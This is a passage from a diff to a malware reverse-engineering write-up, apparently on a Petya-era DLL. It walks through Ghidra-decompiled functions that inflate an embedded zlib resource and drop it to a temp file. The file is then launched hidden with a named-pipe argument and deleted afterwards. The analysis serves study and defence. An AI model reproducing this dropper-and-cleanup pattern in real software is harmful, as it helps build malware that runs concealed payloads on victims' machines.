@@ -7386,13 +7386,266 @@ int FUN_1000a520(LPVOID memory,undefined4 *resource,uint *res_pointer_offset,
 
 Back here we now have a lot more information. We now know for a fact that the resources being extracted is compressed and can be decompressed with zlib. On the other hand we know that the `file` command did not detect the file as being compressed. This is basically impossible, it is much more likely to assume that the functions we named `init_res_l*` are responsible for restoring the header information and perhaps even more data that was intentionally removed in order to make manual extracting of resources possible. This also makes a lot of sense, extracting resources from a dll is easy. There would not even be any reverse engineering required. But by removing the header (encryption is also common) it basically looks like random data. We also see that the second argument for the call was `1.2.8`. Looking at the [changelog](https://www.zlib.net/ChangeLog.txt) for zlib this was precisely the version of zlib that would've been used in 2016 for Petya as it was released in 2013 and version 1.2.9 was only released on the 31st of December 2016. We will rename `init_res_l1` to `init_res_l1_restore_zlib_header`.
 
+After inflating the resource we see a call to `FUN_1000ba60` with the now deflated resource.
 
+### FUN_1000ba60
 
+```cpp
+undefined4 FUN_1000ba60(int param_1){
+  int iVar1;
+  undefined4 uVar2;
+  
+  if (((param_1 == 0) || (iVar1 = *(int *)(param_1 + 0x1c), iVar1 == 0)) ||
+     (*(code **)(param_1 + 0x24) == (code *)0x0)) {
+    uVar2 = 0xfffffffe;
+  }
+  else {
+    if (*(int *)(iVar1 + 0x34) != 0) {
+      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(iVar1 + 0x34));
+    }
+    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
+    *(undefined4 *)(param_1 + 0x1c) = 0;
+    uVar2 = 0;
+  }
+  return uVar2;
+}
+```
 
+The if statement in this function performs a few `NULL` checks and returns an error code if any of them are true. Otherwise we see what appears to be a function being invoked at offset `0x24` in the binary. We also saw this being referenced in the `init` functions in the calling function. It might be reverting some change, but there is really not enough information here to know for sure. We will rename the function to `post_process_resource` for now.
 
+### Back to FUN_1000a520
 
+Normally this would pretty much be the end of this function. However, by accident I noticed some outgoing references inside the `init_res_l1_restore_zlib_header` subroutine. There were listed in Ghidra's outgoing calls view which I opened during the zlib investigation. So first we will go through these calls to see if they might be useful.
 
+### Back to init_res_l2
 
+```cpp
+int init_res_l2(int param_1,uint param_2,char *param_3,int param_4){
+  int iVar1;
+  int iVar2;
+  
+  if (((param_3 == (char *)0x0) || (*param_3 != '1')) || (param_4 != 0x38)) {
+    iVar2 = -6;
+  }
+  else {
+    if (param_1 == 0) {
+      iVar2 = -2;
+    }
+    else {
+      *(undefined4 *)(param_1 + 0x18) = 0;
+      if (*(int *)(param_1 + 0x20) == 0) {
+        *(undefined4 *)(param_1 + 0x20) = 0x1000c223;
+        *(undefined4 *)(param_1 + 0x28) = 0;
+      }
+      if (*(int *)(param_1 + 0x24) == 0) {
+        *(undefined4 *)(param_1 + 0x24) = 0x1000c236;
+      }
+      iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x1bcc);
+      if (iVar1 == 0) {
+        iVar2 = -4;
+      }
+      else {
+        *(int *)(param_1 + 0x1c) = iVar1;
+        *(undefined4 *)(iVar1 + 0x34) = 0;
+        iVar2 = init_res_l3(param_1,param_2);
+        if (iVar2 != 0) {
+          (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar1);
+          *(undefined4 *)(param_1 + 0x1c) = 0;
+        }
+      }
+    }
+  }
+  return iVar2;
+}
+```
+
+Within this function Ghidra picks up two things as function calls. 
+
+```cpp
+*(undefined4 *)(param_1 + 0x20) = 0x1000c223;
+```
+
+Is identified as a call to `FUN_1000c223`.
+
+### FUN_1000c223
+
+```cpp
+void __cdecl FUN_1000c223(undefined4 param_1,int param_2,int param_3){
+  malloc(param_2 * param_3);
+  return;
+}
+```
+
+Given that this function should take 3 parameters it is clear that the way it is called from `ini_res_l2` is very wrong. Although not entirely clear, this function appears to allocate some memory which is most likely returned. Changing the function signature from `void` to `void*` also fixes this.
+
+```cpp
+void * __cdecl FUN_1000c223(undefined4 param_1,int param_2,int param_3){
+  void *pvVar1;
+  
+  pvVar1 = malloc(param_2 * param_3);
+  return pvVar1;
+}
+```
+
+Both in the code and in the assembly `param_1` appears to be unused. We will rename the function to `malloc_product`.
+
+### Back to init_res_l2
+
+We now know that some memory was being allocated.
+
+A bit later in the function we also see.
+
+```cpp
+*(undefined4 *)(param_1 + 0x24) = 0x1000c236;
+```
+
+Which is identified as a call to the subroutine `FUN_1000c236`.
+
+### FUN_1000c236
+
+```cpp
+void __cdecl FUN_1000c236(undefined4 param_1,void *param_2){
+  free(param_2);
+  return;
+}
+```
+
+This function again looks rather simple and `param_1` goes completely unused again. We will just rename the subroutine to `free_memory`.
+
+### Back to FUN_1000a520
+
+We are pretty much done now with this function. There is still plenty of logic we do not properly understand but we know that the general purpose of the subroutien is to decompress the resource. So we will rename it to `decompress_resource`.
+
+### Back to FUN_100085d0
+
+Having finished all the logic in this subroutine we will rename it to `extract_and_inflate_resource`. It should also be noted that we might be able to get another shot at decompiling the resource if we manage to decompress it.
+
+### Back to FUN_10007545
+
+```cpp
+void FUN_10007545(void){
+  SIZE_T SVar1;
+  HANDLE hHeap;
+  HMODULE hModule;
+  FARPROC is_wow_function;
+  HRSRC resource;
+  int iVar2;
+  DWORD dwFlags;
+  UINT UVar3;
+  HRESULT HVar4;
+  BOOL BVar5;
+  char *lpProcName;
+  undefined *lpMem;
+  WCHAR local_1aa4 [1024];
+  WCHAR local_12a4 [1024];
+  WCHAR local_aa4 [520];
+  WCHAR local_694 [780];
+  _STARTUPINFOW local_7c;
+  _PROCESS_INFORMATION local_38;
+  ulong local_28;
+  undefined4 local_24;
+  undefined4 uStack32;
+  undefined4 uStack28;
+  HANDLE local_18;
+  int using_wow64;
+  LPOLESTR local_10;
+  undefined *local_c;
+  SIZE_T local_8;
+  
+  local_c = (undefined *)0x0;
+  local_8 = 0;
+  hHeap = GetCurrentProcess();
+  lpProcName = "IsWow64Process";
+  using_wow64 = 0;
+  hModule = GetModuleHandleW(L"kernel32.dll");
+  is_wow_function = GetProcAddress(hModule,lpProcName);
+  if (is_wow_function != (FARPROC)0x0) {
+    (*is_wow_function)(hHeap,&using_wow64);
+  }
+  resource = FindResourceW(DLL_handle,(LPCWSTR)((uint)(using_wow64 != 0) + 1),(LPCWSTR)0xa);
+  if (resource == (HRSRC)0x0) {
+    iVar2 = 0;
+  }
+  else {
+    iVar2 = extract_and_inflate_resource(&local_8,resource);
+  }
+  if (iVar2 != 0) {
+    dwFlags = GetTempPathW(0x208,local_aa4);
+    lpMem = local_c;
+    SVar1 = local_8;
+    if ((dwFlags != 0) &&
+       (UVar3 = GetTempFileNameW(local_aa4,(LPCWSTR)0x0,0,local_694), lpMem = local_c,
+       SVar1 = local_8, UVar3 != 0)) {
+      local_28 = 0;
+      local_24 = 0;
+      uStack32 = 0;
+      uStack28 = 0;
+      HVar4 = CoCreateGuid((GUID *)&local_28);
+      lpMem = local_c;
+      SVar1 = local_8;
+      if (-1 < HVar4) {
+        local_10 = (LPOLESTR)0x0;
+        HVar4 = StringFromCLSID((IID *)&local_28,&local_10);
+        lpMem = local_c;
+        SVar1 = local_8;
+        if (-1 < HVar4) {
+          iVar2 = FUN_100073ae(local_694,local_c);
+          if (iVar2 != 0) {
+            wsprintfW(local_12a4,L"\\\\.\\pipe\\%ws",local_10);
+            local_18 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_100073fd,local_12a4,0,
+                                    (LPDWORD)0x0);
+            lpMem = local_c;
+            SVar1 = local_8;
+            if (local_18 != (HANDLE)0x0) {
+              local_38.hProcess = (HANDLE)0x0;
+              local_38.hThread = (HANDLE)0x0;
+              local_38.dwProcessId = 0;
+              local_38.dwThreadId = 0;
+              memset(&local_7c,0,0x44);
+              local_7c.wShowWindow = 0;
+              local_7c.cb = 0x44;
+              wsprintfW(local_1aa4,L"\"%ws\" %ws",local_694,local_12a4);
+              BVar5 = CreateProcessW(local_694,local_1aa4,(LPSECURITY_ATTRIBUTES)0x0,
+                                     (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0
+                                     ,(LPSTARTUPINFOW)&local_7c,(LPPROCESS_INFORMATION)&local_38);
+              if (BVar5 != 0) {
+                WaitForSingleObject(local_38.hProcess,60000);
+                FUN_100070fa();
+                TerminateThread(local_18,0);
+              }
+              CloseHandle(local_18);
+              lpMem = local_c;
+              SVar1 = local_8;
+            }
+            while (SVar1 != 0) {
+              *lpMem = 0;
+              lpMem = lpMem + 1;
+              SVar1 = SVar1 - 1;
+            }
+            FUN_100073ae(local_694,local_c);
+            DeleteFileW(local_694);
+          }
+          CoTaskMemFree(local_10);
+          lpMem = local_c;
+          SVar1 = local_8;
+        }
+      }
+    }
+    while (SVar1 != 0) {
+      *lpMem = 0;
+      lpMem = lpMem + 1;
+      SVar1 = SVar1 - 1;
+    }
+    dwFlags = 0;
+    lpMem = local_c;
+    hHeap = GetProcessHeap();
+    HeapFree(hHeap,dwFlags,lpMem);
+  }
+  return;
+}
+```
+
+Back in `FUN_10007545` we see that the remainder of the subroutine is only executed when the resource was extracted succesfully.
 
 
 
